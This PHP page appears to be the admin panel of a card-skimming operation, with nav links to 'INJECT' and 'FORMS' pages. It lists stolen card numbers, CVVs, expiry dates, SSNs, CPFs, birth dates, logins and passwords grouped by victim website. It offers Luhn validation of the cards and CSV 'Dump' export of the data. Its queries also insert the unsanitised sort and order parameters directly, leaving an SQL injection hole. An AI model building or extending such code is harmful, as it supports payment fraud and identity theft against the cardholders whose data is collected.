<?php
session_start();


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF token validation failed");
    }
}

$_SESSION['csrf_token'] = bin2hex(random_bytes(32));


$userRole = $_SESSION['user_role'];

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}
require 'includes/config.php';

if (isset($_POST['clear_cc_number'])) {
    require 'includes/config.php';  

$query = "UPDATE cc SET 
    payment_cc_number = NULL,
    payment_cc_exp_month = NULL,
    payment_cc_exp_year = NULL,
    payment_cc_cid = NULL,
    payment_cc_owner = NULL,
    billing_country_id = NULL,
    billing_state = NULL,
    billing_city = NULL,
    billing_street = NULL,
    billing_postcode = NULL,
    billing_firstname = NULL,
    billing_lastname = NULL,
    billing_telephone = NULL,
    billing_email = NULL";

if ($db->query($query) === TRUE) {
    echo "Records updated successfully";
} else {
    echo "Error updating record: " . $db->error;
}


    $db->close();
    header('Location: ' . $_SERVER['PHP_SELF']); // Перезагрузка страницы
    exit();
}

if (!isset($_SESSION['luna_check'])) {
    $_SESSION['luna_check'] = true; // Устанавливаем значение по умолчанию
}

if (isset($_POST['luna_check'])) {
    $_SESSION['luna_check'] = $_POST['luna_check'] === 'on';
} elseif (isset($_POST['submitted'])) {
    $_SESSION['luna_check'] = false;
}

$lunaCheckEnabled = $_SESSION['luna_check'];

function securePrint($value) {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8">
    <title>Cards Page</title>
    <link href="js/tailwind.min.css" rel="stylesheet">
    <link href="js/all.min.css" rel="stylesheet">
    <style>
        .bg-navy { background-color: #1a1a1a; }
        .border-gold { border-color: #2f2e2c; }
        .text-gold { color: #d4af37; }
        .sidebar-link { white-space: nowrap; }
        .blink {
            animation: blinker 1s linear infinite;
            color: red;
            cursor: pointer;
        }
        @keyframes blinker {
            50% { opacity: 0; }
        }
        .popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .popup-inner {
            background-color: #1a1a1a;
            border: 1px solid #a5001e;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.7);
            color: #ffffff;
        }
        .flex-container {
            display: flex;
            align-items: center;
        }
        .blink {
            margin-left: 10px;
        }
    </style>
	<style>
    .modal {
        display: none;
        position: fixed;
        z-index: 1;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0, 0, 0, 0.6);
    }

    .modal-content {
        background-color: #1a1a1a;
        margin: 15% auto;
        padding: 20px;
        border: 1px solid #2f2e2c;
        width: 80%;
        color: #d4af37;
		 max-width: 600px;
    width: 100%;
}

.modal-content h2 {
    color: #d4af37;
}

.modal-content label {
    color: #d4af37;
}

.modal-content select {
    background-color: #1a1a1a;
    color: #d4af37;
    border-color: #2f2e2c;
}

    .close {
        color: #d4af37;
        float: right;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }
</style>
</head>
<body class="bg-navy text-gold">
    <div class="flex flex-col min-h-screen">
        <nav class="bg-navy border-b-2 px-6 py-4">
            <div class="container mx-auto flex justify-between items-center">
                <div class="flex space-x-4">
                    <a href="dashboard.php" class="text-yellow-500 hover:text-white">DASHBOARD</a>
                    <a href="cards.php?url_id=&country=&date=&records=20&sort=id&order=desc" class="text-yellow-500 hover:text-white">CARDS</a>
                    <a href="inject.php" class="text-yellow-500 hover:text-white">INJECT</a>
                    <a href="tools.php" class="text-yellow-500 hover:text-white">TOOLS</a>
                    <a href="forms.php" class="text-yellow-500 hover:text-white">FORMS</a>
					<a href="uptime.php" class="text-yellow-500 hover:text-white">UPTIME</a>
                </div>
                <div>
                    <a href="logout.php" class="text-yellow-500 hover:text-white">LOGOUT</a>
                </div>
            </div>
        </nav>

        <div class="container mt-8">
            <div class="flex flex-col md:flex-row md:space-x-8">
                <div class="md:w-1/4 ml-4">
                    <div class="bg-gray-800 p-4 rounded-lg shadow-lg">
                        <center>
                               <h1 class="text-yellow-500 text-2xl">Sites<br>
                               <?php if ($userRole === 'admin'): ?>
                               <a href="#" onclick="showExportModalAll()" class="text-sm text-green-700 hover:text-blue-500">(Dump)</a><br>
                               <button id="dumpAndClearBtn" onclick="showDumpAndClearModal()" class="text-sm text-red-700 hover:text-blue-500 ml-2">(Dump and Clear DB)</button>
                               <?php endif; ?>
                               </h1>
							<div id="exportModal" class="modal">
    <div class="modal-content">
        <span class="close">&times;</span>
        <h2 class="text-2xl mb-4">Select Fields to Export</h2>
        <form action="includes/export.php" method="post" target="_blank">
		 <input type="hidden" name="url_id" id="exportUrlId" value="">
            <div class="grid grid-cols-2 gap-4 mb-4">
			    <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="type" class="mr-2">
                    <span>BINS</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="payment_cc_number" class="mr-2">
                    <span>Card Number</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="payment_cc_exp_month" class="mr-2">
                    <span>Month</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="payment_cc_exp_year" class="mr-2">
                    <span>Year</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="payment_cc_cid" class="mr-2">
                    <span>CVV</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_firstname" class="mr-2">
                    <span>F.Name</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_lastname" class="mr-2">
                    <span>L.Name</span>
                </label>
				<label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="payment_cc_owner" class="mr-2">
                    <span>Card Owner</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_country_id" class="mr-2">
                    <span>Country ID</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_state" class="mr-2">
                    <span>State</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_city" class="mr-2">
                    <span>City</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_street" class="mr-2">
                    <span>Street</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_postcode" class="mr-2">
                    <span>Postcode</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_telephone" class="mr-2">
                    <span>Telephone</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="billing_email" class="mr-2">
                    <span>Email</span>
                </label>
				<label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="CPF" class="mr-2">
                    <span>CPF</span>
                </label>
				<label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="SSN" class="mr-2">
                    <span>SSN</span>
                </label>
				<label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="DOB" class="mr-2">
                    <span>DOB</span>
                </label>
				<label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="Other" class="mr-2">
                    <span>Other</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="ip" class="mr-2">
                    <span>IP</span>
                </label>
				
				<label class="flex items-center">
    <input type="checkbox" name="fields[]" value="login" class="mr-2">
    <span>Login</span>
</label>
<label class="flex items-center">
    <input type="checkbox" name="fields[]" value="password" class="mr-2">
    <span>Password</span>
</label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="ua" class="mr-2">
                    <span>UserAgent</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="fulldatalog" class="mr-2">
                    <span>Full_log</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="url_id" class="mr-2">
                    <span>URL</span>
                </label>
                <label class="flex items-center">
                    <input type="checkbox" name="fields[]" value="date" class="mr-2">
                    <span>DATE</span>
                </label>
            </div>
            <div class="mb-4">
                <label class="block mb-2">Separator:</label>
                <select name="separator" class="bg-navy text-gold border border-gold rounded py-2 px-3 appearance-none focus:outline-none focus:shadow-outline">
                    <option value=",">Comma</option>
                    <option value=";">Semicolon</option>
                    <option value="|">Vertical bar</option>
                </select>
            </div>
			<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
            <button type="submit" class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded">
                Export Selected
            </button>
        </form>
    </div>
</div>


                        </center>
                        <div id="confirmationModal" class="popup" style="display: none;">
                            <div class="popup-inner">
                                <p>You Sure?</p>
                                <button id="confirmBtn" class="text-green-700">Yes</button>
                                <button id="cancelBtn" class="text-red-700">No</button>
                            </div>
                        </div>
                        <br>
<?php
require 'includes/config.php';

$userRole = $_SESSION['user_role'];

if ($userRole === 'user' || $userRole === 'tech') {
    $userId = $_SESSION['user_id'];
    $siteQuery = "SELECT cc.url_id, COUNT(*) as count 
                  FROM cc 
                  INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                  WHERE user_sites.user_id = $userId AND cc.payment_cc_number IS NOT NULL
                  GROUP BY cc.url_id";
} else {
    $siteQuery = "SELECT url_id, COUNT(*) as count 
                  FROM cc 
                  WHERE payment_cc_number IS NOT NULL
                  GROUP BY url_id";
}

$siteResult = $db->query($siteQuery);

while ($siteRow = $siteResult->fetch_assoc()) {
    echo "<p><a class='sidebar-link text-sm text-gold-300 hover:text-blue-500' href='?url_id=" . urlencode($siteRow['url_id']) . "&country=&date=&records=20&sort=id&order=asc'>" . securePrint($siteRow['url_id']) . " <span class='text-green-700'>(" . (int)$siteRow['count'] . ")</span></a>";
if ($userRole === 'admin') {
    echo "<button onclick=\"showExportModal('" . addslashes($siteRow['url_id']) . "')\"><i class='fas fa-arrow-circle-down'></i></button>";
}
echo "</p>";
}
?>
                    </div>
                </div>

                <div class="md:w-4/4 mt-4 md:mt-0">
                    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                        <div class="flex mb-4 items-center">
                            <form action="" method="get" class="mr-4">
    <label for="records" class="text-yellow-500">Cards per page:</label>
    <select name="records" id="records" onchange="this.form.submit()" class="text-yellow-500 border border-gray-700" style="background-color: #1A1A1A;">
        <option value="20" <?php echo (isset($_GET['records']) && $_GET['records'] == '20') ? 'selected' : ''; ?>>20</option>
        <option value="50" <?php echo (isset($_GET['records']) && $_GET['records'] == '50') ? 'selected' : ''; ?>>50</option>
        <option value="100" <?php echo (isset($_GET['records']) && $_GET['records'] == '100') ? 'selected' : ''; ?>>100</option>
    </select>
	<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="hidden" name="sort" value="<?php echo isset($_GET['sort']) ? htmlspecialchars($_GET['sort']) : 'id'; ?>">
    <input type="hidden" name="order" value="<?php echo isset($_GET['order']) ? htmlspecialchars($_GET['order']) : 'desc'; ?>">
    <input type="hidden" name="url_id" value="<?php echo isset($_GET['url_id']) ? htmlspecialchars($_GET['url_id']) : ''; ?>">
    <input type="hidden" name="country" value="<?php echo isset($_GET['country']) ? htmlspecialchars($_GET['country']) : ''; ?>">
    <input type="hidden" name="date" value="<?php echo isset($_GET['date']) ? htmlspecialchars($_GET['date']) : ''; ?>">
</form>


                           <?php if ($userRole === 'admin'): ?>
    <form action="" method="post" style="margin-right: 20px;">
        <input type="hidden" name="clear_cc_number" value="1">
		<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
        <button type="submit" class="text-yellow-500" title="Если у вас были неверные поля и вы их заблокировали. Нажмите для того, чтобы очистить бд от неверных полей.">Clear Invalid Fields</button>
    </form>
<?php endif; ?>
                            <form action="" method="post" id="lunaCheckForm">
                                <label for="luna_check" class="text-yellow-500">Enable Luna Check:</label>
								<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <input type="checkbox" name="luna_check" id="luna_check" <?php echo $lunaCheckEnabled ? 'checked' : ''; ?> onchange="document.getElementById('lunaCheckForm').submit();">
                                <input type="hidden" name="submitted" value="1">
                            </form>
                            <button id="customizeTableBtn" class="bg-yellow-500 hover:bg-yellow-600 text-white font-bold py-2 px-4 rounded ml-4">
                                Customize table
                            </button>
							<?php if ($userRole === 'admin'): ?>
        <button type="submit" form="deleteForm" id="deleteSelectedBtn" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded ml-4" style="display: none;">
            Delete Selected
        </button>
    <?php endif; ?>
</div>
                     

                        <?php
                        require 'includes/config.php';

                        function isValidCardNumber($cardNumber) {
                            if (!$cardNumber || strlen($cardNumber) < 13 || strlen($cardNumber) > 19) {
                                return false;
                            }
                            $cardNumber = str_replace(' ', '', $cardNumber);
                            $sum = 0;
                            $alternate = false;
                            for ($i = strlen($cardNumber) - 1; $i >= 0; $i--) {
                                $n = (int)$cardNumber[$i];
                                if ($alternate) {
                                    $n *= 2;
                                    if ($n > 9) {
                                        $n = ($n % 10) + 1;
                                    }
                                }
                                $sum += $n;
                                $alternate = !$alternate;
                            }
                            return ($sum % 10 === 0);
                        }

                        // Параметры пагинации и сортировки
                        $perPage = isset($_GET['records']) ? (int)$_GET['records'] : 20;
                        $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
                        $start = ($page > 1) ? ($page * $perPage) - $perPage : 0;
                        $urlIdFilter = $_GET['url_id'] ?? '';
                        $countryFilter = $_GET['country'] ?? '';
                        $dateFilter = $_GET['date'] ?? '';
                        $sort = $_GET['sort'] ?? 'id';
                        $order = $_GET['order'] ?? 'asc';

                        // Начальный запрос
if ($userRole === 'user' || $userRole === 'tech') {
    $userId = $_SESSION['user_id']; // Получаем ID текущего пользователя из сессии
    $query = "SELECT cc.* FROM cc 
              INNER JOIN user_sites ON cc.url_id = user_sites.url_id
              WHERE user_sites.user_id = $userId AND cc.payment_cc_number IS NOT NULL";
} else {
    // Для администратора оставляем запрос без изменений
    $query = "SELECT * FROM cc WHERE payment_cc_number IS NOT NULL";
}

// Добавление фильтров
if (!empty($urlIdFilter)) {
    $query .= " AND cc.url_id = '" . $db->real_escape_string($urlIdFilter) . "'";
}
if (!empty($countryFilter)) {
    $query .= " AND cc.billing_country_id = '" . $db->real_escape_string($countryFilter) . "'";
}
if (!empty($dateFilter)) {
    $query .= " AND DATE(cc.date) = '" . $db->real_escape_string($dateFilter) . "'";
}

// Добавление сортировки и пагинации
$query .= " ORDER BY `$sort` $order LIMIT $start, $perPage";
                        // Выполнение запроса
                        $result = $db->query($query);

                        function sortLink($field, $currentSort, $currentOrder, $currentParams) {
                            $newOrder = ($currentSort == $field && $currentOrder == 'asc') ? 'desc' : 'asc';
                            $queryParams = array_merge($currentParams, ['sort' => $field, 'order' => $newOrder]);
                            return 'cards.php?' . http_build_query($queryParams);
                        }

                        echo "<div class='overflow-x-auto'>";
						echo "<form action='includes/delete_multiple.php' method='post' id='deleteForm'>";
                        echo "<table class='min-w-full divide-y divide-gold border-separate my-table' style='border-spacing: 0;'>";
                       echo "<thead class='bg-navy'>";
echo "<tr class='text-gold'>";
$currentParams = ['url_id' => $urlIdFilter, 'country' => $countryFilter, 'date' => $dateFilter, 'records' => $perPage];
if ($userRole === 'admin') {
    echo "<th class='border border-gold px-2'><input type='checkbox' id='selectAll'></th>";
}
echo "<th class='border border-gold px-2'><a href='" . sortLink('id', $sort, $order, $currentParams) . "' class='text-yellow-500 hover:text-white' data-column='id'>ID&#9660;</a></th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='url_id'>URL ID</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='type'>BINS</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='card_number'>Card Number</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='month'>Month</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='year'>Year</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='cvv'>CVV</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='fname'>F.Name</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='lname'>L.Name</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='owner'>Owner</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='street'>Street</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='city'>City</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='state'>State</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='postcode'>Postcode</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='country_id'>Country ID</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='telephone'>Telephone</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='email'>Email</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='CPF'>CPF</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='SSN'>SSN</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='DOB'>DOB</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='Other'>Other</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='ip'>IP</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='date'>Date</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='login'>Login</th>";
echo "<th class='border border-gold px-2 text-yellow-500 table-column' data-column='password'>Password</th>";
echo "</tr>";
echo "</thead>";
                        echo "<tbody class='bg-navy text-gold divide-y divide-x divide-gold'>";
            while ($row = $result->fetch_assoc()) {
    echo "<tr>";
    if ($userRole === 'admin') {
        echo "<td class='border border-gold px-2 text-center'><input type='checkbox' name='selected_ids[]' value='" . securePrint($row['id']) . "'></td>";
        echo "<td class='border border-gold px-2' data-column='id'><a href='#' onclick='showMenu(event, " . securePrint($row['id']) . ", \"" . securePrint($row['url_id']) . "\")' class='text-blue-700 hover:text-blue-400'>" . securePrint($row['id']) . "</a></td>";
    } else {
        echo "<td class='border border-gold px-2 text-blue-700' data-column='id' >" . securePrint($row['id']) . "</td>";
    }
    echo "<td class='border border-gold px-2 table-column' data-column='url_id'>" . securePrint($row['url_id']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='type'>" . securePrint($row['type']) . "</td>";

    if ($lunaCheckEnabled) {
    $cardNumbers = explode(',', $row['payment_cc_number']);
    $formattedCardNumbers = [];

    foreach ($cardNumbers as $cardNumber) {
        $cardNumberTrimmed = trim(str_replace(' ', '', $cardNumber));
        
        // Определение типа карты по первым цифрам номера
        $cardType = '';
if (preg_match('/^4/', $cardNumberTrimmed)) {
    $cardType = 'visa';
} elseif (preg_match('/^(5[1-5]|2[2-7])/', $cardNumberTrimmed)) {
    $cardType = 'mastercard';
} elseif (preg_match('/^3[47]/', $cardNumberTrimmed)) {
    $cardType = 'amex';
} elseif (preg_match('/^6(?:011|5[0-9]{2}|4[4-9][0-9]{3}|22(?:1(?:2[6-9]|[3-9][0-9])|[2-8][0-9]{2}|9(?:[01][0-9]|2[0-5])))/', $cardNumberTrimmed)) {
    $cardType = 'discover';
} elseif (preg_match('/^9792/', $cardNumberTrimmed)) {
    $cardType = 'hiper';
} elseif (preg_match('/^(50|56|57|58|6[0-9])/', $cardNumberTrimmed)) { // Добавляем поддержку для Maestro
    $cardType = 'maestro';
}
        
       if ($userRole === 'user' || $userRole === 'tech') {
   $maskedCardNumber = substr($cardNumber, 0, 6) . str_repeat('*', strlen($cardNumber) - 6);
   if (isValidCardNumber($cardNumberTrimmed)) {
       $formattedCardNumbers[] = "<span style='display: inline-flex; align-items: center;'><img src='js/" . securePrint($cardType) . ".svg' alt='" . securePrint($cardType) . "' width='20' height='20' style='margin-right: 5px;'><span style='color: green;'>" . securePrint($maskedCardNumber) . "</span></span>";
   } else {
       $formattedCardNumbers[] = "<span style='display: inline-flex; align-items: center;'><img src='js/" . securePrint($cardType) . ".svg' alt='" . securePrint($cardType) . "' width='20' height='20' style='margin-right: 5px;'><span style='color: red;'>" . securePrint($maskedCardNumber) . "</span></span>";
   }
} else {
   if (isValidCardNumber($cardNumberTrimmed)) {
       $formattedCardNumbers[] = "<span style='display: inline-flex; align-items: center;'><img src='js/" . securePrint($cardType) . ".svg' alt='" . securePrint($cardType) . "' width='20' height='20' style='margin-right: 5px;'><span style='color: green;'>" . securePrint($cardNumber) . "</span></span>";
   } else {
       $formattedCardNumbers[] = "<span style='display: inline-flex; align-items: center;'><img src='js/" . securePrint($cardType) . ".svg' alt='" . securePrint($cardType) . "' width='20' height='20' style='margin-right: 5px;'><span style='color: red;'>" . securePrint($cardNumber) . "</span></span>";
   }
}
    }

    $cardNumbersWithBreaks = implode(',<br>', $formattedCardNumbers);
    echo "<td class='border border-gold px-2 table-column whitespace-nowrap' style='padding-right: 30px;' data-column='card_number'>" . $cardNumbersWithBreaks . "</td>";
} else {
    $cardNumber = $row['payment_cc_number'];
    if ($userRole === 'user' || $userRole === 'tech') {
        $cardNumbers = explode(',', $cardNumber);
        $maskedCardNumbers = [];
        foreach ($cardNumbers as $card) {
            $maskedCard = substr($card, 0, 6) . str_repeat('*', strlen($card) - 6);
            $maskedCardNumbers[] = $maskedCard;
        }
        $cardNumbersWithBreaks = implode(',<br>', $maskedCardNumbers);
    } else {
        $cardNumbersWithBreaks = str_replace(',', ',<br>', $cardNumber);
    }
    echo "<td class='border border-gold px-2 table-column whitespace-nowrap' data-column='card_number'>" . $cardNumbersWithBreaks . "</td>";
}

    echo "<td class='border border-gold px-2 table-column' data-column='month'>" . securePrint($row['payment_cc_exp_month']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='year'>" . securePrint($row['payment_cc_exp_year']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='cvv'>" . securePrint($row['payment_cc_cid']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='fname'>" . securePrint($row['billing_firstname']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='lname'>" . securePrint($row['billing_lastname']) . "</td>";
	echo "<td class='border border-gold px-2 table-column' data-column='owner'>" . securePrint($row['payment_cc_owner']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='street'>" . securePrint($row['billing_street']) . "</td>";
	echo "<td class='border border-gold px-2 table-column' data-column='city'>" . securePrint($row['billing_city']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='state'>" . securePrint($row['billing_state']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='postcode'>" . securePrint($row['billing_postcode']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='country_id'>" . securePrint($row['billing_country_id']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='telephone'>" . securePrint($row['billing_telephone']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='email'>" . securePrint($row['billing_email']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='CPF'>" . securePrint($row['CPF']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='SSN'>" . securePrint($row['SSN']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='DOB'>" . securePrint($row['DOB']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='Other'>" . securePrint($row['Other']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='ip'>" . securePrint($row['ip']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='date'>" . securePrint($row['date']) . "</td>";
	echo "<td class='border border-gold px-2 table-column' data-column='login'>" . securePrint($row['login']) . "</td>";
    echo "<td class='border border-gold px-2 table-column' data-column='password'>" . securePrint($row['password']) . "</td>";
    echo "</tr>";
}
                    echo "</tbody>";
                    echo "</table>";
                    echo "</form>";
                    // Вывод ссылок на пагинацию
if ($userRole === 'user' || $userRole === 'tech') {
    $userId = $_SESSION['user_id'];
    $totalQuery = "SELECT COUNT(*) as total FROM cc 
                   INNER JOIN user_sites ON cc.url_id = user_sites.url_id
                   WHERE user_sites.user_id = $userId AND cc.payment_cc_number IS NOT NULL";
} else {
    $totalQuery = "SELECT COUNT(*) as total FROM cc WHERE payment_cc_number IS NOT NULL";
}                if (!empty($urlIdFilter)) {
                        $totalQuery .= " AND cc.url_id = '" . $db->real_escape_string($urlIdFilter) . "'";
                    }
                    // Добавление других фильтров для подсчета общего количества
                    if (!empty($countryFilter)) {
                        $totalQuery .= " AND cc.billing_country_id = '" . $db->real_escape_string($countryFilter) . "'";
                    }
                    if (!empty($dateFilter)) {
                        $totalQuery .= " AND DATE(cc.date) = '" . $db->real_escape_string($dateFilter) . "'";
                    }
                    $totalResult = $db->query($totalQuery);
                    $db->close();
                    ?>

                    <div class="pagination text-gold-300">
                        <?php
                        if ($totalRow = $totalResult->fetch_assoc()) {
                            $totalRecords = $totalRow['total'];
                            $totalPages = ceil($totalRecords / $perPage);
                            for ($i = 1; $i <= $totalPages; $i++) {
                                echo "<a href='?page=$i&records=$perPage&url_id=$urlIdFilter&country=$countryFilter&date=$dateFilter&sort=$sort&order=$order' class='text-yellow-500 hover:text-white'>" . $i . "</a> ";
                            }
                        }
                        ?>
                    </div>

                    <div id="popupMenu" style="display: none; position: absolute; z-index: 1000;" class="bg-navy border-gold border rounded shadow-lg">
                        <ul class="list-none m-0 p-0">
                            <li><a href="#" id="editLink" class="block px-4 py-2 text-gold hover:bg-gray-700 hover:text-white">EDIT</a></li>
                            <li><a href="#" onclick="deleteRecord(event)" class="block px-4 py-2 text-gold hover:bg-gray-700 hover:text-white">DELETE</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="customizeTableModal" class="fixed z-10 inset-0 overflow-y-auto hidden">
    <div class="flex items-center justify-center min-h-screen">
        <div class="fixed inset-0 transition-opacity">
            <div class="absolute inset-0 bg-black opacity-70"></div>
        </div>
        <div class="bg-navy rounded-lg overflow-hidden shadow-xl transform transition-all sm:max-w-lg sm:w-full">
<div class="bg-gray-800 px-4 py-3 flex justify-between items-center">
    <h2 class="text-2xl font-medium text-yellow-500">Customize Table</h2>
    <button id="closeCustomizeTableModal" class="text-yellow-500 hover:text-white focus:outline-none">
        <svg class="h-6 w-6 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
            <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd" />
        </svg>
    </button>
</div>
            <div class="px-4 py-3 bg-navy">
                <div class="grid grid-cols-2 gap-4">
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="url_id" checked>
                        <span class="text-yellow-500">URL ID</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="type" checked>
                        <span class="text-yellow-500">BINS</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="card_number" checked>
                        <span class="text-yellow-500">Card Number</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="month" checked>
                        <span class="text-yellow-500">Month</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="year" checked>
                        <span class="text-yellow-500">Year</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="cvv" checked>
                        <span class="text-yellow-500">CVV</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="fname" checked>
                        <span class="text-yellow-500">F.Name</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="lname" checked>
                        <span class="text-yellow-500">L.Name</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="owner" checked>
                        <span class="text-yellow-500">Owner</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="street" checked>
                        <span class="text-yellow-500">Street</span>
                    </label>
					 <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="city" checked>
                        <span class="text-yellow-500">City</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="state" checked>
                        <span class="text-yellow-500">State</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="postcode" checked>
                        <span class="text-yellow-500">Postcode</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="country_id" checked>
                        <span class="text-yellow-500">Country ID</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="telephone" checked>
                        <span class="text-yellow-500">Telephone</span>
                    </label>
